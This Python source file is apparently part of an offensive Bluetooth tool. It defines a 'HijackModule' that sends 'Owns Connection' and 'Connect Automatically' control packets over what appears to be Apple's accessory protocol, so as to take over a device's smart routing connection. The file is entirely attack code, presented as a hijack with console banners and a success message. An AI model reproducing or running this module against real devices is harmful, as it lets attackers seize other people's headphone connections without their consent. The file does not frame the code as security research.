from core.connection import AAPConnection
from core.packet_builder import PacketBuilder
import time

class HijackModule:
    def __init__(self, connection: AAPConnection, console=None):
        self.connection = connection
        self.console = console

    def log(self, message):
        if self.console:
            self.console.print(message)
        else:
            print(message)

    def run_smart_routing_hijack(self):
        self.log("[bold red][*] Initiating Smart Routing Hijack...[/bold red]")
        if not self.connection.sock:
             self.log("[red][!] Not connected.[/red]")
             return

        # Use spinner if console is available
        if self.console:
            with self.console.status("[bold red]Hijacking in progress...[/bold red]", spinner="bouncingBar"):
                self._execute_hijack_sequence()
        else:
            self._execute_hijack_sequence()

    def _execute_hijack_sequence(self):
        self.log("[*] Sending 'Owns Connection' (0x06 = 0x01)...")
        pkt_own = PacketBuilder.build_control_command(PacketBuilder.CMD_OWNS_CONNECTION, 0x01)
        self.connection.send(pkt_own)
        time.sleep(0.5)

        self.log("[*] Sending 'Connect Automatically' (0x20 = 0x01)...")
        pkt_auto = PacketBuilder.build_control_command(PacketBuilder.CMD_AUTO_CONNECT, 0x01)
        self.connection.send(pkt_auto)
        time.sleep(0.5)
        
        response = self.connection.receive()
        if response:
            self.log(f"[green][+] Response received:[/green] {response.hex()}")
            self.log("[bold green][+] Hijack Commands Sent Successfully![/bold green]")
        else:
            self.log("[yellow][-] No immediate response. This is common for control commands.[/yellow]")
